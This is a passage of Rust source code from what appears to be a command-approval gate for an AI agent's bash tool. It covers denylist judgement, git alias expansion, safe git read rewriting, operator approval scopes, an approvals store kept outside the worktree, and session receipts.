        }
    }
    command
        .args(GIT_FREE_CONFIG)
        .args(args)
        .current_dir(worktree)
        .stdin(Stdio::null())
        .output()
        .ok()
}

/// git's own reading of what a free read depends on in `worktree`:
/// `rev-parse --git-path info/attributes`, and `config --includes
/// --name-only --get-regexp` for the signing, format and branch-sort keys,
/// includes followed. `None` when either cannot be read.
#[must_use]
pub fn git_repository(worktree: &Path) -> Option<Repository> {
    let path = git_reading(worktree, &["rev-parse", "--git-path", "info/attributes"])?;
    if !path.status.success() {
        return None;
    }
    let path = String::from_utf8(path.stdout).ok()?;
    let path = worktree.join(path.trim_end_matches('\n'));
    let info_attributes = std::fs::read_to_string(&path)
        .map(|text| !text.trim().is_empty())
        .or_else(|why| {
            if why.kind() == std::io::ErrorKind::NotFound {
                Ok(false)
            } else {
                Err(why)
            }
        })
        .ok()?;
    let keys = git_reading(
        worktree,
        &[
            "config",
            "--includes",
            "--name-only",
            "--get-regexp",
            r"^(gpg|pretty)\.|^format\.pretty$|^branch\.sort$",
        ],
    )?;
    // Exit 1 is "no such key"; anything else but 0 is unread.
    let keys = match keys.status.code() {
        Some(0) => String::from_utf8_lossy(&keys.stdout).into_owned(),
        Some(1) => String::new(),
        _ => return None,
    };
    let signing = keys
        .lines()
        .any(|key| key != "format.pretty" && key != GIT_BRANCH_SORT);
    let branch_sort = keys.lines().any(|key| key == GIT_BRANCH_SORT);
    Some(Repository {
        info_attributes,
        signing,
        branch_sort,
    })
}

/// Reads one git alias, read-only, from the repository's and the user's
/// config: `git config --get alias.<name>` in the worktree.
pub type AliasReader = fn(&Path, &str) -> Option<String>;

/// git's own reading of `alias.<name>` in `worktree`, with nothing but
/// `PATH` and `HOME` passed: no repository hook runs for `git config`.
#[must_use]
pub fn git_alias(worktree: &Path, name: &str) -> Option<String> {
    let mut command = Command::new("git");
    command.env_clear();
    for key in ["PATH", "HOME"] {
        if let Some(value) = std::env::var_os(key) {
            command.env(key, value);
        }
    }
    let output = command
        .args(GIT_FREE_CONFIG)
        .args(["config", "--get", &format!("alias.{name}")])
        .current_dir(worktree)
        .stdin(Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8(output.stdout).ok()?;
    Some(text.trim_end_matches('\n').to_owned())
}

/// A `bash` call's command, judged: what the gate said once aliases are
/// expanded and approvals applied, and what runs if it runs.
#[derive(Debug, Clone)]
pub struct Judged {
    /// The command line, as the model sent it.
    pub command: String,
    /// The argv its line records: `bash -c <command>`.
    pub argv: Vec<String>,
    /// What runs: `argv`, or a free git read rewritten with its overrides.
    pub run: Vec<String>,
    /// Every segment's verdict.
    pub judgement: Judgement,
    /// Whether the line is a git alias, which no standing approval covers.
    pub alias: bool,
    /// For each segment, the allow-set entry that approved it.
    pub covered_by: Vec<Option<usize>>,
    digests: Digests,
}

impl Judged {
    /// What the line comes to.
    #[must_use]
    pub fn outcome(&self) -> shell_gate::Outcome {
        self.judgement.outcome()
    }

    /// The first prompting segment's `why`, as the log words it.
    #[must_use]
    pub fn why(&self) -> Option<&'static str> {
        self.judgement
            .segments
            .iter()
            .find_map(|segment| match &segment.verdict {
                Verdict::Prompt(why) => Some(why_word(why)),
                _ => None,
            })
    }

    /// Whether a standing decision can answer the prompt: every prompting
    /// segment has a shape, the line is no alias, and an `npm run` script
    /// can be named.
    #[must_use]
    pub fn standing(&self) -> bool {
        !self.alias
            && self.judgement.segments.iter().all(|segment| {
                !matches!(segment.verdict, Verdict::Prompt(_))
                    || segment
                        .shape
                        .as_ref()
                        .is_some_and(|shape| self.digests.wanted(shape).is_some())
            })
    }

    /// The entries a standing decision of `scope` grants: one per prompting
    /// segment's shape, and per digest it binds to.
    #[must_use]
    pub fn grants(&self, scope: Scope, decided_at: u64) -> Vec<Entry> {
        let why = self.why().map(str::to_owned);
        let mut out: Vec<Entry> = Vec::new();
        for segment in &self.judgement.segments {
            if !matches!(segment.verdict, Verdict::Prompt(_)) {
                continue;
            }
            let Some(shape) = &segment.shape else {
                continue;
            };
            for digest in self.digests.wanted(shape).unwrap_or_default() {
                let entry = Entry {
                    shape: shape.clone(),
                    digest,
                    scope,
                    origin: Origin::Operator,
                    decided_at: Some(decided_at),
                    why: why.clone(),
                    approved_unix_ms: None,
                };
                if !out
                    .iter()
                    .any(|e| e.shape == entry.shape && e.digest == entry.digest)
                {
                    out.push(entry);
                }
            }
        }
        out
    }

    /// Every prompting segment approved `once`, by a decision on this line.
    pub fn approve_once(&mut self) {
        let line = self.command.clone();
        let once = Approval::Once { line: line.clone() };
        for segment in &mut self.judgement.segments {
            if matches!(segment.verdict, Verdict::Prompt(_)) && once.covers(&line, segment) {
                segment.verdict = Verdict::Approved(Scope::Once);
            }
        }
    }
}

/// The gate as the loop holds it: the denylist, the worktree an `npm`
/// digest and a git alias are read in, and how an alias is read.
#[derive(Debug, Clone)]
pub struct Gate {
    /// The list the drive judges by: [`Denylist::standard`].
    pub denylist: Denylist,
    /// The worktree, absolute.
    pub worktree: PathBuf,
    /// How a git alias is read.
    pub aliases: AliasReader,
    /// How the repository's state that a free read depends on is read.
    pub repository: RepositoryReader,
    /// Whether the session passes an `npm_config_*` variable: then no `npm`
    /// command is standing.
    pub npm_env: bool,
}

impl Gate {
    /// The drive's gate over `worktree`, for a session passing
    /// `environment` (the policy's names).
    #[must_use]
    pub fn standard(worktree: &Path) -> Self {
        Self {
            denylist: Denylist::standard(),
            worktree: worktree.to_path_buf(),
            aliases: git_alias,
            repository: git_repository,
            npm_env: false,
        }
    }

    /// The same, knowing the environment a command is passed: an
    /// `npm_config_*` name makes every `npm` command non-standing, since it
    /// changes what npm runs as `.npmrc` does -- except
    /// [`NPM_CONFIG_EXCUSED`].
    #[must_use]
    pub fn passing(mut self, environment: &[String]) -> Self {
        self.npm_env = environment.iter().any(|name| {
            let lower = name.to_ascii_lowercase();
            CONFIG_PREFIXES
                .iter()
                .any(|prefix| lower.starts_with(prefix))
                && !NPM_CONFIG_EXCUSED.contains(&name.as_str())
        });
        self
    }

    /// Whether the free read `words` (`git <sub> …`) can run as one in this
    /// repository: its `info/attributes` is empty or absent, and, for a read
    /// that prints commits -- `log`, `show`, and `git branch` verbose, with a
    /// format, or under a configured `branch.sort` -- no `gpg.*`,
    /// `format.pretty` or `pretty.*` key is in its effective config.
    /// Unreadable is not free.
    fn still_free(&self, words: &[String]) -> bool {
        let Some(repository) = (self.repository)(&self.worktree) else {
            return false;
        };
        let sub = words.get(1).map_or("", String::as_str);
        let prints_commits = GIT_PRINTS_COMMITS.contains(&sub)
            || (sub == "branch"
                && (repository.branch_sort
                    || words[2..].iter().any(|w| {
                        GIT_BRANCH_VERBOSE.contains(&w.as_str()) || w.starts_with("--format")
                    })));
        let blocked = repository.info_attributes || (prints_commits && repository.signing);
        !blocked
    }

    /// Judge `command` against `allowed`: the gate's verdict on the argv
    /// it would run, a git alias read through to its expansion, a free read
    /// kept free only where it can run with its overrides, and each
    /// prompting segment approved where an entry covers it.
    #[must_use]
    pub fn judge(&self, command: &str, allowed: &[Entry]) -> Judged {
        let argv = argv_of(command);
        let mut judgement = shell_gate::judge_argv(&argv, &self.denylist);
        let mut alias = false;
        let mut run = argv.clone();
        let simple = simple_git(command);
        let mut free_words = simple.clone();
        if let Some(words) = &simple
            && let [only] = judgement.segments.as_slice()
            && matches!(only.verdict, Verdict::Prompt(Why::Dynamic(_)))
            && let Some(expanded) = (self.aliases)(&self.worktree, &words[1])
        {
            alias = true;
            if let Some(shell_text) = expanded.strip_prefix('!') {
                // A shell alias is dynamic, so it prompts -- but what it runs
                // still meets the denylist, judged by its true shape.
                let inner = shell_gate::judge_argv(&argv_of(shell_text), &self.denylist);
                if inner.refused_by().is_some() {
                    judgement = inner;
                }
                free_words = None;
            } else if let Some(expansion) = alias_words(&expanded) {
                let mut words_now = vec!["git".to_owned()];
                words_now.extend(expansion);
                words_now.extend(words[2..].iter().cloned());
                judgement = shell_gate::judge_argv(&words_now, &self.denylist);
                free_words = Some(words_now);
            } else {
                free_words = None;
            }
        }
        let rewritable = free_words.as_ref().filter(
            |_| matches!(judgement.segments.as_slice(), [only] if only.verdict == Verdict::Free),
        );
        let rewritable = rewritable.filter(|words| self.still_free(words));
        if let Some(words) = rewritable {
            run = free_read(words);
        } else {
            // A free read this cannot run with its overrides is not free.
            for segment in &mut judgement.segments {
                if segment.verdict == Verdict::Free && segment.shape.is_some() {
                    segment.verdict = Verdict::Prompt(Why::NotApproved);
                }
            }
        }
        let digests = Digests::of(command, &judgement.segments, &self.worktree, self.npm_env);
        let mut judged = Judged {
            command: command.to_owned(),
            argv,
            run,
            covered_by: vec![None; judgement.segments.len()],
            judgement,
            alias,
            digests,
        };
        if !alias {
            cover(&mut judged, allowed);
        }
        judged
    }
}

/// Each prompting segment of `judged` an entry of `allowed` covers, approved
/// under that entry's scope: its shape by the gate's own `covers`, and its
/// digests, where it binds any, every one held by an entry of that shape.
fn cover(judged: &mut Judged, allowed: &[Entry]) {
    let line = judged.command.clone();
    for (at, segment) in judged.judgement.segments.iter_mut().enumerate() {
        if !matches!(segment.verdict, Verdict::Prompt(_)) {
            continue;
        }
        let Some(shape) = segment.shape.clone() else {
            continue;
        };
        let Some(wanted) = judged.digests.wanted(&shape) else {
            continue;
        };
        let covering = |entry: &Entry| {
            Approval::Standing {
                scope: entry.scope,
                shape: entry.shape.clone(),
            }
            .covers(&line, segment)
        };
        let all_held = wanted.iter().all(|digest| {
            allowed
                .iter()
                .any(|entry| covering(entry) && entry.digest == *digest)
        });
        if !all_held {
            continue;
        }
        let Some(first) = allowed
            .iter()
            .position(|entry| covering(entry) && wanted.contains(&entry.digest))
        else {
            continue;
        };
        segment.verdict = Verdict::Approved(allowed[first].scope);
        judged.covered_by[at] = Some(first);
    }
}

/// The words of `command` when it is one plain git call -- one simple
/// command, no assignment or redirection, every word literal, `git` then a
/// subcommand with no option before it -- which a free read can be run as
/// directly, and an alias read through.
fn simple_git(command: &str) -> Option<Vec<String>> {
    let list = shell::parse(command).ok()?;
    let [and_or] = list.items.as_slice() else {
        return None;
    };
    let [link] = and_or.chain.as_slice() else {
        return None;
    };
    let [shell::Command::Simple(simple)] = link.pipeline.as_slice() else {
        return None;
    };
    if and_or.background
        || !simple.assignments.is_empty()
        || !simple.redirections.is_empty()
        || simple.words.iter().any(|w| !w.literal)
    {
        return None;
    }
    let words: Vec<String> = simple.words.iter().map(|w| w.text.clone()).collect();
    (words.first().map(String::as_str) == Some("git")
        && words.get(1).is_some_and(|sub| !sub.starts_with('-')))
    .then_some(words)
}

/// An alias's value as words, when it is literal words alone.
fn alias_words(value: &str) -> Option<Vec<String>> {
    let list = shell::parse(value).ok()?;
    let [and_or] = list.items.as_slice() else {
        return None;
    };
    let [link] = and_or.chain.as_slice() else {
        return None;
    };
    let [shell::Command::Simple(simple)] = link.pipeline.as_slice() else {
        return None;
    };
    if !simple.assignments.is_empty()
        || !simple.redirections.is_empty()
        || simple.words.is_empty()
        || simple.words.iter().any(|w| !w.literal)
    {
        return None;
    }
    Some(simple.words.iter().map(|w| w.text.clone()).collect())
}

/// A free git read as it runs: `git`, git's programs off, the subcommand,
/// the diff programs and submodules off where it takes them, then the
/// model's arguments.
fn free_read(words: &[String]) -> Vec<String> {
    let mut run = vec!["env".to_owned()];
    run.extend(GIT_FREE_ENV.iter().map(|w| (*w).to_owned()));
    run.push("git".to_owned());
    run.extend(GIT_FREE_CONFIG.iter().map(|w| (*w).to_owned()));
    run.push(words[1].clone());
    if GIT_DIFFING.contains(&words[1].as_str()) {
        run.extend(GIT_NO_PROGRAMS.iter().map(|w| (*w).to_owned()));
    }
    if GIT_SUBMODULE_READS.contains(&words[1].as_str()) {
        run.push(GIT_NO_SUBMODULES.to_owned());
    }
    run.extend(words[2..].iter().cloned());
    run
}

/// What a refused call shows the model, in the ordinary register.
#[must_use]
pub fn refusal_text(reason: log::ToolRefusal, detail: &str) -> String {
    match reason {
        log::ToolRefusal::Denylist => format!(
            "(the drive did not run this command: `{detail}` is on the drive's denylist, which \
             no approval grants.)\n"
        ),
        log::ToolRefusal::Declined => {
            "(the drive did not run this command: the operator declined it.)\n".to_owned()
        }
        log::ToolRefusal::Unparsable => format!(
            "(the drive did not run this call: its arguments are not the JSON object \
             {{\"command\": \"...\"}} the `{BASH}` tool takes.)\n"
        ),
        _ => format!("(the drive did not run this call: {}.)\n", reason.tag()),
    }
}

/// The working directory a call's line records: `worktree` as a `~` path
/// when it lies under `home`, never expanded to a user; else as given.
#[must_use]
pub fn cwd_label(worktree: &Path, home: Option<&Path>) -> String {
    if let Some(home) = home.filter(|home| !home.as_os_str().is_empty())
        && let Ok(rest) = worktree.strip_prefix(home)
    {
        let rest = rest.to_string_lossy();
        return if rest.is_empty() {
            "~".to_owned()
        } else {
            format!("~/{rest}")
        };
    }
    worktree.to_string_lossy().into_owned()
}

/// What a regimen declares for the loop.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Declared {
    /// The pre-seeded session allow set, as written.
    pub allowed_commands: Vec<String>,
    /// `[limits] max_steps`.
    pub max_steps: Option<u32>,
    /// The stance, as written.
    pub approval_policy: Option<String>,
    /// `approval = "none"`: no gate decision, no prompt.
    pub approvals_off: bool,
    /// `tool_call_text_fallback = "on"`: a call written as text is
    /// recovered when a turn makes no native call (#560).
    pub text_fallback: bool,
    /// `[tool_output]`: the cap on what the model is shown of a tool's
    /// output (#554), the convention's default when the table is absent.
    pub output_cap: OutputCap,
    /// `tool_surface`: the tools the model is offered (#557).
    pub surface: ToolSurface,
}

/// The tool surface lever (#557): the tools the model is offered.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum ToolSurface {
    /// `bash` alone: today's, the default.
    #[default]
    Bash,
    /// `bash`, then the standard set: `read`, `write`, `edit`.
    Standard,
}

impl ToolSurface {
    /// The tools a request declares under this surface, in order.
    #[must_use]
    pub fn tools(self) -> Vec<ToolDefinition> {
        let mut tools = vec![bash_tool()];
        if self == Self::Standard {
            tools.extend(super::standard::definitions());
        }
        tools
    }

    /// The read tool the surface offers, by name, when it offers one.
    #[must_use]
    pub fn read_tool(self) -> Option<String> {
        (self == Self::Standard).then(|| super::standard::READ.to_owned())
    }
}

/// The regimen's key for the tool surface (#557).
pub const TOOL_SURFACE: &str = "tool_surface";

/// `tool_surface` read: `bash` (the default) or `standard`.
///
/// # Errors
///
/// Any other value.
pub fn tool_surface(regimen: &Regimen) -> Result<ToolSurface, String> {
    match regimen.get(TOOL_SURFACE) {
        None => Ok(ToolSurface::Bash),
        Some(regimen::Value::String(word)) if word == "bash" => Ok(ToolSurface::Bash),
        Some(regimen::Value::String(word)) if word == "standard" => Ok(ToolSurface::Standard),
        Some(_) => Err(format!(
            "`{TOOL_SURFACE}` takes \"bash\" (the default) or \"standard\""
        )),
    }
}

/// The regimen's table for the cap on tool output (#554).
pub const TOOL_OUTPUT: &str = "tool_output";

/// `[tool_output]` read: the default cap when absent; `cap = false` turns it
/// off (the output kept whole); `max_lines` and `max_bytes` set the limits.
///
/// # Errors
///
/// A table of the wrong shape: `cap` not a boolean, or a limit not a
/// positive integer.
pub fn output_cap(regimen: &Regimen) -> Result<OutputCap, String> {
    let Some(value) = regimen.get(TOOL_OUTPUT) else {
        return Ok(OutputCap::DEFAULT);
    };
    let regimen::Value::Table(table) = value else {
        return Err(format!("`{TOOL_OUTPUT}` is not a table"));
    };
    match table.get("cap") {
        None | Some(regimen::Value::Boolean(true)) => {}
        Some(regimen::Value::Boolean(false)) => return Ok(OutputCap::Keep),
        Some(_) => return Err(format!("`[{TOOL_OUTPUT}] cap` is not a boolean")),
    }
    let OutputCap::Capped {
        max_lines: default_lines,
        max_bytes: default_bytes,
    } = OutputCap::DEFAULT
    else {
        unreachable!("the default caps");
    };
    let limit = |key: &str, default: usize| match table.get(key) {
        None => Ok(default),
        Some(regimen::Value::Integer(n)) if *n > 0 => Ok(usize::try_from(*n).unwrap_or(usize::MAX)),
        Some(_) => Err(format!("`[{TOOL_OUTPUT}] {key}` is not a positive integer")),
    };
    Ok(OutputCap::Capped {
        max_lines: limit("max_lines", default_lines)?,
        max_bytes: limit("max_bytes", default_bytes)?,
    })
}

/// What `regimen` declares for the loop, or `None` when it runs no commands
/// (no [`ALLOWED_COMMANDS`]).
///
/// # Errors
///
/// A key of the wrong shape: `allowed_commands` not a list of non-empty
/// strings, `max_steps` not a positive integer, `approval_policy` not a
/// string.
pub fn declared(regimen: &Regimen) -> Result<Option<Declared>, String> {
    let output_cap = output_cap(regimen)?;
    let surface = tool_surface(regimen)?;
    let in_limits = match regimen.get(LIMITS) {
        None => None,
        Some(regimen::Value::Table(limits)) => match limits.get(MAX_STEPS) {
            None => None,
            Some(regimen::Value::Integer(steps)) if *steps > 0 => {
                Some(u32::try_from(*steps).unwrap_or(u32::MAX))
            }
            Some(_) => {
                return Err(format!(
                    "`[{LIMITS}] {MAX_STEPS}` is not a positive integer"
                ));
            }
        },
        Some(_) => return Err(format!("`{LIMITS}` is not a table")),
    };
    // The top-level key (#569), leniently, before `[limits]`.
    let max_steps = crate::drive::regimen::top_level_max_steps(regimen).or(in_limits);
    let approval_policy = match regimen.get(APPROVAL_POLICY) {
        None => None,
        Some(regimen::Value::String(text)) => Some(text.clone()),
        Some(_) => return Err(format!("`{APPROVAL_POLICY}` is not a string")),
    };
    let approvals_off = match regimen.get(APPROVAL) {
        None => false,
        Some(regimen::Value::String(state)) if state == "none" => true,
        Some(_) => {
            return Err(format!(
                "`{APPROVAL}` takes one value, \"none\" (approvals off); leave it out for the \
                 gate"
            ));
        }
    };
    let text_fallback = match regimen.get(TOOL_CALL_TEXT_FALLBACK) {
        None => false,
        Some(regimen::Value::String(state)) if state == "off" => false,
        Some(regimen::Value::String(state)) if state == "on" => true,
        Some(_) => {
            return Err(format!(
                "`{TOOL_CALL_TEXT_FALLBACK}` takes \"off\" (the default) or \"on\""
            ));
        }
    };
    let Some(value) = regimen.get(ALLOWED_COMMANDS) else {
        // Approvals off runs commands with no allow set to seed.
        return Ok(approvals_off.then(|| Declared {
            allowed_commands: Vec::new(),
            max_steps,
            approval_policy,
            approvals_off,
            text_fallback,
            output_cap,
            surface,
        }));
    };
    let regimen::Value::Array(items) = value else {
        return Err(format!("`{ALLOWED_COMMANDS}` is not a list"));
    };
    let mut allowed_commands = Vec::with_capacity(items.len());
    for item in items {
        match item {
            regimen::Value::String(text) if !text.is_empty() => allowed_commands.push(text.clone()),
            _ => {
                return Err(format!(
                    "`{ALLOWED_COMMANDS}` holds something that is not a non-empty string"
                ));
            }
        }
    }
    Ok(Some(Declared {
        allowed_commands,
        max_steps,
        approval_policy,
        approvals_off,
        text_fallback,
        output_cap,
        surface,
    }))
}

/// The pre-seeded entries `commands` declare: each line's segments, by shape
/// (#29 5981447912: the allow set is a receipt, and `allowed_commands` is a
/// pre-seeded session set).
///
/// # Errors
///
/// A line the denylist refuses, or one with a segment no standing approval
/// could cover.
pub fn preseeded(commands: &[String], gate: &Gate) -> Result<Vec<Entry>, String> {
    let mut out: Vec<Entry> = Vec::new();
    for command in commands {
        let judged = shell_gate::judge_argv(&argv_of(command), &gate.denylist);
        if let Some(entry) = judged.refused_by() {
            return Err(format!(
                "`{ALLOWED_COMMANDS}` names `{command}`, which the denylist refuses (`{entry}`)"
            ));
        }
        let digests = Digests::of(command, &judged.segments, &gate.worktree, gate.npm_env);
        for segment in &judged.segments {
            let Some(shape) = &segment.shape else {
                return Err(format!(
                    "`{ALLOWED_COMMANDS}` names `{command}`, which no standing approval can \
                     cover (a segment with no shape)"
                ));
            };
            let Some(wanted) = digests.wanted(shape) else {
                return Err(format!(
                    "`{ALLOWED_COMMANDS}` names `{command}`, whose `npm run` script cannot be named"
                ));
            };
            for digest in wanted {
                if !out.iter().any(|e| e.shape == *shape && e.digest == digest) {
                    out.push(Entry {
                        shape: shape.clone(),
                        digest,
                        scope: Scope::Preseeded,
                        origin: Origin::Regimen,
                        decided_at: None,
                        why: None,
                        approved_unix_ms: None,
                    });
                }
            }
        }
    }
    Ok(out)
}

/// The workspace approvals of one worktree, kept outside it (#298 point 7).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Store {
    path: PathBuf,
}

/// The state directory the drive keeps its approvals under:
/// `$XDG_STATE_HOME`, else `$HOME/.local/state`.
#[must_use]
pub fn state_home() -> Option<PathBuf> {
    std::env::var_os("XDG_STATE_HOME")
        .filter(|dir| !dir.is_empty())
        .map(PathBuf::from)
        .or_else(|| {
            std::env::var_os("HOME")
                .filter(|home| !home.is_empty())
                .map(|home| PathBuf::from(home).join(".local").join("state"))
        })
}

impl Store {
    /// Where `worktree`'s approvals are kept under `state_home`:
    /// `discipline/approvals/<sha256 of the canonical worktree path>.toml`.
    #[must_use]
    pub fn path_for(state_home: &Path, worktree: &Path) -> PathBuf {
        let canonical = crate::isolation::policy::canonical_prefix(worktree);
        state_home
            .join("discipline")
            .join("approvals")
            .join(format!(
                "{}.toml",
                sha256_hex(canonical.to_string_lossy().as_bytes())
            ))
    }

    /// The store for `worktree`, and the approvals it already holds.
    ///
    /// # Errors
    ///
    /// The store would lie in the worktree or a directory `policy` declares
    /// writable, where a command could write an approval; or it holds text
    /// that is not a store.
    pub fn open(
        state_home: &Path,
        worktree: &Path,
        policy: &Policy,
    ) -> Result<(Self, Vec<Entry>), String> {
        let path = Self::path_for(state_home, worktree);
        let resolved = crate::isolation::policy::canonical_prefix(&path);
        let writable = std::iter::once(crate::isolation::policy::canonical_prefix(worktree)).chain(
            policy
                .writable
                .iter()
                .map(|dir| crate::isolation::policy::resolved(dir)),
        );
        for dir in writable {
            if resolved.starts_with(&dir) {
                return Err(format!(
                    "the approvals store `{}` lies in `{}`, which a command can write; refusing \
                     to start",
                    path.display(),
                    dir.display()
                ));
            }
        }
        let entries = match std::fs::read_to_string(&path) {
            Ok(text) => read_store(&text).map_err(|why| format!("{}: {why}", path.display()))?,
            Err(why) if why.kind() == std::io::ErrorKind::NotFound => Vec::new(),
            Err(why) => return Err(format!("{} cannot be read: {why}", path.display())),
        };
        Ok((Self { path }, entries))
    }

    /// Where it is.
    #[must_use]
    pub fn path(&self) -> &Path {
        &self.path
    }

    /// Write `entries`, the worktree's workspace approvals, whole: each
    /// kept with the time it was approved, or `now` where it carries none.
    ///
    /// # Errors
    ///
    /// The file could not be written, or an entry holds a character the
    /// store cannot spell.
    pub fn write(&self, entries: &[Entry], now: u64) -> Result<(), String> {
        let mut text = String::from(
            "# discipline's workspace approvals for one worktree (#298 point 7), written by\n\
             # diet-drive. Each table is one approval: its shape, the digest it binds to,\n\
             # its scope, why it prompted and when it was approved.\n",
        );
        for (at, entry) in entries.iter().enumerate() {
            let fields = [
                Some(("program", entry.shape.program.as_str())),
                entry.shape.subcommand.as_deref().map(|s| ("subcommand", s)),
                entry.digest.as_deref().map(|d| ("digest", d)),
                Some(("scope", "workspace")),
                entry.why.as_deref().map(|w| ("why", w)),
            ];
            let _ = write!(text, "\n[approval-{}]\n", at + 1);
            for (key, value) in fields.into_iter().flatten() {
                if value
                    .chars()
                    .any(|c| c == '"' || c == '\\' || c.is_control())
                {
                    return Err(format!(
                        "the approval of `{}` holds a character the store cannot spell",
                        entry.shape
                    ));
                }
                let _ = writeln!(text, "{key} = \"{value}\"");
            }
            let approved = entry.approved_unix_ms.unwrap_or(now);
            let _ = writeln!(text, "approved_unix_ms = {approved}");
        }
        if let Some(dir) = self.path.parent() {
            std::fs::create_dir_all(dir)
                .map_err(|why| format!("{} cannot be made: {why}", dir.display()))?;
        }
        std::fs::write(&self.path, text)
            .map_err(|why| format!("{} cannot be written: {why}", self.path.display()))
    }
}

/// The entries a store's text holds.
fn read_store(text: &str) -> Result<Vec<Entry>, String> {
    let read = regimen::parse(text).map_err(|why| format!("not a store: {why:?}"))?;
    let mut out = Vec::new();
    for (_, table) in read.iter() {
        let regimen::Value::Table(fields) = table else {
            return Err("a key outside an approval's table".to_owned());
        };
        let text = |key: &str| match fields.get(key) {
            Some(regimen::Value::String(value)) => Some(value.clone()),
            _ => None,
        };
        let program = text("program").ok_or("an approval with no program")?;
        out.push(Entry {
            shape: Shape {
                program,
                subcommand: text("subcommand"),
            },
            digest: text("digest"),
            scope: Scope::Workspace,
            origin: Origin::Store,
            // Decided before this session opened: the earliest moment on
            // its clock.
            decided_at: Some(0),
            why: text("why").or_else(|| Some("not_approved".to_owned())),
            approved_unix_ms: match fields.get("approved_unix_ms") {
                Some(regimen::Value::Integer(ms)) => u64::try_from(*ms).ok(),
                _ => None,
            },
        });
    }
    Ok(out)
}

/// The decisions an operator made, by scope, and the calls declined.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Counts {
    /// `once` decisions.
    pub once: u64,
    /// `session` decisions.
    pub session: u64,
    /// `workspace` decisions.
    pub workspace: u64,
    /// Pre-seeded entries.
    pub preseeded: u64,
    /// Prompts declined.
    pub declined: u64,
}

/// `git status --porcelain` on each of `policy`'s writable directories that
/// is a git checkout, keyed as the regimen wrote it (#301 5981929426: the
/// reference checkout's `reference_modified`). Run with git's programs off.
#[must_use]
pub fn reference_modified(policy: &Policy) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    for dir in &policy.writable {
        let path = crate::isolation::policy::home_expanded(dir);
        if !path.join(".git").exists() {
            continue;
        }
        let mut command = Command::new("git");
        command.env_clear();
        for key in ["PATH", "HOME"] {
            if let Some(value) = std::env::var_os(key) {
                command.env(key, value);
            }
        }
        let status = command
            .args(GIT_FREE_CONFIG)
            .args(["status", "--porcelain"])
            .current_dir(&path)
            .stdin(Stdio::null())
            .output();
        let said = match status {
            Ok(output) if output.status.success() => {
                String::from_utf8_lossy(&output.stdout).into_owned()
            }
            Ok(output) => format!(
                "git status failed: {}",
                String::from_utf8_lossy(&output.stderr).trim_end()
            ),
            Err(why) => format!("git status could not run: {why}"),
        };
        out.insert(dir.clone(), said);
    }
    out
}

/// The session's receipt (#298 point 9; #29 5981447912): the final allow
/// set with each entry's scope and origin, the denylist's digest, the
/// decisions by scope, the regimen's stance, what dependencies' lifecycle
/// scripts were, the environment a command received, and what became of
/// each writable reference checkout.
#[must_use]
pub fn receipt(
    allowed: &[Entry],
    counts: Counts,
    approval_policy: Option<&str>,
    policy: &Policy,
    reference: &BTreeMap<String, String>,
) -> Value {
    let text = |s: &str| Value::String(s.to_owned());
    let count = |n: u64| Value::Integer(i64::try_from(n).unwrap_or(i64::MAX));
    let allow = allowed
        .iter()
        .map(|entry| {
            let mut fields = BTreeMap::from([
                ("shape".to_owned(), text(&entry.shape.to_string())),
                ("scope".to_owned(), text(scope_tag(entry.scope).tag())),
                ("origin".to_owned(), text(entry.origin.tag())),
            ]);
            if let Some(digest) = &entry.digest {
                fields.insert("digest".to_owned(), text(digest));
            }
            Value::Object(fields)
        })
        .collect();
    let mut fields = BTreeMap::from([
        ("allow".to_owned(), Value::Array(allow)),
        (
            "denylist_sha256".to_owned(),
            text(&shell_gate::denylist_digest()),
        ),
        (
            "approvals".to_owned(),
            Value::Object(BTreeMap::from([
                ("once".to_owned(), count(counts.once)),
                ("session".to_owned(), count(counts.session)),
                ("workspace".to_owned(), count(counts.workspace)),
                ("preseeded".to_owned(), count(counts.preseeded)),
                ("declined".to_owned(), count(counts.declined)),
            ])),
        ),
        ("lifecycle_scripts".to_owned(), text(LIFECYCLE_SCRIPTS)),
        (
            "env_passthrough".to_owned(),
            Value::Array(policy.environment.iter().map(|name| text(name)).collect()),
        ),
        (
            "reference_modified".to_owned(),
            Value::Object(
                reference
                    .iter()
                    .map(|(dir, said)| (dir.clone(), text(said)))
                    .collect(),
            ),
        ),
    ]);
    if let Some(stance) = approval_policy {
        fields.insert(APPROVAL_POLICY.to_owned(), text(stance));
    }
    Value::Object(fields)
}

/// What the loop runs a call under, held by the session for its length.
#[derive(Debug)]
pub struct Tools {
    /// The confinement, opened at start.
    pub confinement: Confinement,
    /// The policy it was opened for.
    pub policy: Policy,
    /// The worktree, absolute: where commands run.
    pub worktree: PathBuf,
    /// The worktree as a call's line records it ([`cwd_label`]).
    pub cwd: String,
    /// The step bound: the `max_steps`-th request's calls do not run.
    pub max_steps: Option<u32>,
    /// Who answers a prompt.
    pub decider: Decider,
    /// The gate.
    pub gate: Gate,
    /// The allow set the session opens with: pre-seeds, then the store's.
    pub allowed: Vec<Entry>,
    /// The workspace store, when the session keeps one.
    pub store: Option<Store>,
    /// The regimen's stance, for the receipt.
    pub approval_policy: Option<String>,
    /// Approvals off (`approval = "none"`): every command runs with no gate
    /// decision and no prompt, under the same confinement.
    pub approvals_off: bool,
    /// Whether a call the model writes as text is recovered when a turn
    /// makes no native call (#560).
    pub text_fallback: bool,
    /// The cap on what the model is shown of a tool's output (#554).
    pub output_cap: OutputCap,
    /// The recording's directory, where a capped output is kept whole;
    /// `None` when the session keeps no recording.
    pub recording: Option<PathBuf>,
    /// The session's read tool, by name, when it offers one: what the cap's
    /// notice tells the model to read the whole output with.
    pub read_tool: Option<String>,
    /// The tools the model is offered (#557).
    pub surface: ToolSurface,
}

vocabulary! {
    /// Who answers a prompt.
    Decider {
        /// Nobody: every prompt is declined (the gym, #298 point 9).
        Decline => "decline",
        /// An operator, through `serve`'s `POST /approve` (point 8). The loop
        /// waits, with no timeout.
        Operator => "operator",
    }
}

vocabulary! {
    /// An operator's answer to a prompt.
    Decision {
        /// Run it, this once.
        Once => "once",
        /// Run it, and every call of its shapes this session.
        Session => "session",
        /// Run it, and every call of its shapes in this worktree, kept.
        Workspace => "workspace",
        /// Do not run it.
        Decline => "decline",
    }
}

/// A prompt waiting on the operator: what `/events` shows as `event:
/// waiting` (#298 point 8), in the shape #389 ruled at 5982826097 point 2
